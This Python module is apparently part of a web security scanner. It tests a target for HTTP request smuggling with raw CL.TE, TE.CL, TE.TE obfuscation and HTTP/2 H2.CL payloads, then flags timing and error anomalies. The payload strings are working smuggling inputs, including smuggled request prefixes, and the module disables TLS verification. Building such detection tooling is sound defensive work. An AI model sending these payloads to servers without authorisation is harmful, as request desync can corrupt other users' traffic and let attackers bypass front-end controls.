"""C17 – HTTP request smuggling tester.

Probes for CL.TE, TE.CL, TE.TE obfuscation, H2.CL, and request-splitting
vulnerabilities using timing and response-based detection techniques.
"""

from __future__ import annotations

import asyncio
import socket
import ssl
import time
from datetime import datetime
from typing import Any
from urllib.parse import urlparse

import httpx

from app.modules.base_module import BaseModule

# ---------------------------------------------------------------------------
# Smuggling probe payloads
# ---------------------------------------------------------------------------

# CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
# We send a request where CL says body is short but TE chunk includes extra data
_CL_TE_PROBE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "X"  # Smuggled prefix; CL=6 stops before this, TE processes "0\r\n\r\n" + queues "X"
)

# TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
_TE_CL_PROBE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "5c\r\n"
    "GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n\r\nx=1\r\n"
    "0\r\n"
    "\r\n"
)

# TE.TE obfuscation variants
_TE_OBFUSCATION_VARIANTS = [
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
    "Transfer-Encoding: [chunked]",
    "Transfer-Encoding:\tchunked",
    " Transfer-Encoding: chunked",
    "X: X\r\nTransfer-Encoding: chunked",
]

# Timing probe: CL.TE detection via timeout
_CL_TE_TIMING_PROBE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "1\r\n"
    "A\r\n"
    "0\r\n"
    "\r\n"
)

# TE.CL timing probe
_TE_CL_TIMING_PROBE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
)

# Timing threshold in seconds — responses taking longer than this may indicate parsing delay
_TIMING_THRESHOLD = 6.0


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------


class HTTPSmuggling(BaseModule):
    """HTTP request smuggling tester.

    Probes for CL.TE, TE.CL, TE.TE obfuscation, H2.CL (via httpx), and
    request splitting using both timing-based and error-based detection.
    """

    name = "http_smuggling"
    description = (
        "Detects HTTP request smuggling: CL.TE, TE.CL, TE.TE obfuscation, "
        "H2.CL, request splitting — via timing and error-based probes."
    )
    version = "1.0.0"
    category = "web_security"

    async def run(self, target: str, **kwargs) -> dict[str, Any]:
        """Probe *target* for HTTP request smuggling.

        Args:
            target: Full URL or host:port.
            **kwargs:
                path (str): Path to test (default: /).
                timeout (int): Socket/HTTP timeout in seconds (default: 15).
                timing_based (bool): Use timing probes in addition to error-based (default: True).

        Returns:
            Dict with ``findings``, ``probe_results``, and metadata.
        """
        self.started_at = datetime.utcnow()
        path: str = kwargs.get("path", "/")
        timeout = int(kwargs.get("timeout", 15))
        use_timing: bool = bool(kwargs.get("timing_based", True))

        parsed = urlparse(_normalise_url(target))
        host = parsed.hostname or target
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_tls = parsed.scheme == "https"

        probe_results: list[dict[str, Any]] = []

        # 1. CL.TE probe (raw TCP)
        res = await asyncio.to_thread(
            self._raw_probe, host, port, use_tls, _CL_TE_PROBE.format(host=host), "CL.TE", timeout
        )
        probe_results.append(res)
        self._evaluate_probe(res, "CL.TE", host)

        # 2. TE.CL probe (raw TCP)
        res = await asyncio.to_thread(
            self._raw_probe, host, port, use_tls, _TE_CL_PROBE.format(host=host), "TE.CL", timeout
        )
        probe_results.append(res)
        self._evaluate_probe(res, "TE.CL", host)

        # 3. TE.TE obfuscation variants
        for variant in _TE_OBFUSCATION_VARIANTS:
            payload = _build_te_te_probe(host, variant)
            res = await asyncio.to_thread(
                self._raw_probe, host, port, use_tls, payload, f"TE.TE:{variant[:40]}", timeout
            )
            probe_results.append(res)
            self._evaluate_probe(res, f"TE.TE ({variant[:40]})", host)

        # 4. Timing-based probes
        if use_timing:
            for probe_type, payload_tpl in [
                ("CL.TE_timing", _CL_TE_TIMING_PROBE),
                ("TE.CL_timing", _TE_CL_TIMING_PROBE),
            ]:
                res = await asyncio.to_thread(
                    self._raw_probe, host, port, use_tls, payload_tpl.format(host=host),
                    probe_type, timeout
                )
                probe_results.append(res)
                if res.get("elapsed", 0) >= _TIMING_THRESHOLD:
                    self.add_finding(
                        title=f"HTTP smuggling timing anomaly ({probe_type.replace('_timing', '')})",
                        severity="high",
                        description=(
                            f"Request took {res['elapsed']:.2f}s — above the "
                            f"{_TIMING_THRESHOLD}s threshold. This is consistent with "
                            f"a {probe_type.replace('_timing', '')} smuggling desync."
                        ),
                        evidence=f"Elapsed: {res['elapsed']:.2f}s, status: {res.get('status')}",
                        url=f"{'https' if use_tls else 'http'}://{host}:{port}{path}",
                        probe_type=probe_type,
                    )

        # 5. H2.CL probe via httpx (HTTP/2 with mismatched Content-Length)
        await self._h2_cl_probe(host, port, use_tls, path, timeout)

        self.completed_at = datetime.utcnow()
        return {
            "module": self.name,
            "target": target,
            "findings": self.results,
            "probe_results": probe_results,
            "started_at": self.started_at.isoformat(),
            "completed_at": self.completed_at.isoformat(),
        }

    # ------------------------------------------------------------------ #
    # Raw TCP probe                                                        #
    # ------------------------------------------------------------------ #

    def _raw_probe(
        self,
        host: str,
        port: int,
        use_tls: bool,
        payload: str,
        probe_type: str,
        timeout: int,
    ) -> dict[str, Any]:
        """Send *payload* as raw bytes over TCP and capture the response."""
        result: dict[str, Any] = {"probe_type": probe_type, "host": host}
        start = time.monotonic()
        try:
            raw_sock = socket.create_connection((host, port), timeout=timeout)
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                sock: socket.socket = ctx.wrap_socket(raw_sock, server_hostname=host)
            else:
                sock = raw_sock

            with sock:
                sock.settimeout(timeout)
                sock.sendall(payload.encode("utf-8", errors="replace"))
                chunks: list[bytes] = []
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        chunks.append(chunk)
                        if len(b"".join(chunks)) > 32768:
                            break
                except socket.timeout:
                    pass
                response = b"".join(chunks).decode("utf-8", errors="replace")

            elapsed = time.monotonic() - start
            status = _parse_status_code(response)
            result.update({
                "status": status,
                "elapsed": round(elapsed, 4),
                "response_snippet": response[:500],
            })
        except Exception as exc:
            elapsed = time.monotonic() - start
            result.update({"error": str(exc), "elapsed": round(elapsed, 4), "status": -1})
        return result

    # ------------------------------------------------------------------ #
    # H2.CL probe                                                         #
    # ------------------------------------------------------------------ #

    async def _h2_cl_probe(
        self, host: str, port: int, use_tls: bool, path: str, timeout: int
    ) -> None:
        """Send an HTTP/2 request with a mismatched Content-Length header."""
        url = f"{'https' if use_tls else 'http'}://{host}:{port}{path}"
        # HTTP/2 smuggled body: send more bytes than Content-Length claims
        smuggled_suffix = "GET /smuggled HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)
        body = "x=1&" + smuggled_suffix

        try:
            async with httpx.AsyncClient(
                http2=True, timeout=timeout, verify=False
            ) as client:
                resp = await client.post(
                    url,
                    content=body.encode(),
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Content-Length": "3",  # Deliberate mismatch
                    },
                )
                if resp.status_code == 400:
                    self.add_finding(
                        title="H2.CL smuggling probe: 400 response (possible desync)",
                        severity="medium",
                        description=(
                            "An HTTP/2 request with a mismatched Content-Length returned "
                            "a 400 error. This may indicate server-side confusion consistent "
                            "with H2.CL request smuggling."
                        ),
                        evidence=f"HTTP {resp.status_code}: {resp.text[:200]}",
                        url=url,
                    )
        except Exception:
            pass

    # ------------------------------------------------------------------ #
    # Evaluation helpers                                                   #
    # ------------------------------------------------------------------ #

    def _evaluate_probe(self, result: dict[str, Any], variant: str, host: str) -> None:
        """Evaluate raw-probe result for signs of smuggling."""
        status = result.get("status", -1)
        snippet = result.get("response_snippet", "")
        # 400 or 500 with timeout can indicate server-side parsing confusion
        if status == 400 and "invalid" in snippet.lower():
            self.add_finding(
                title=f"HTTP smuggling indicator ({variant})",
                severity="medium",
                description=(
                    f"The server returned HTTP 400 with an error body matching "
                    f"a {variant} smuggling probe, suggesting the server rejects "
                    "malformed chunked encoding."
                ),
                evidence=f"Status: {status}\n{snippet[:300]}",
                url=f"http://{host}",
                variant=variant,
            )
        elif status == 200 and result.get("elapsed", 0) > _TIMING_THRESHOLD:
            self.add_finding(
                title=f"HTTP smuggling timing anomaly ({variant})",
                severity="high",
                description=(
                    f"The {variant} probe returned HTTP 200 but took "
                    f"{result['elapsed']:.2f}s — indicating a possible desync."
                ),
                evidence=f"Elapsed: {result['elapsed']:.2f}s",
                url=f"http://{host}",
                variant=variant,
            )


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------


def _normalise_url(target: str) -> str:
    if not target.startswith(("http://", "https://")):
        return f"https://{target}"
    return target


def _parse_status_code(response: str) -> int:
    """Extract HTTP status code from raw response string."""
    try:
        first_line = response.split("\r\n", 1)[0]
        parts = first_line.split(" ", 2)
        return int(parts[1])
    except (IndexError, ValueError):
        return -1


def _build_te_te_probe(host: str, te_header: str) -> str:
    """Build a TE.TE obfuscation probe with the given Transfer-Encoding header."""
    return (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        f"{te_header}\r\n"
        "\r\n"
        "5c\r\n"
        "SMUGGLED\r\n"
        "0\r\n"
        "\r\n"
    )
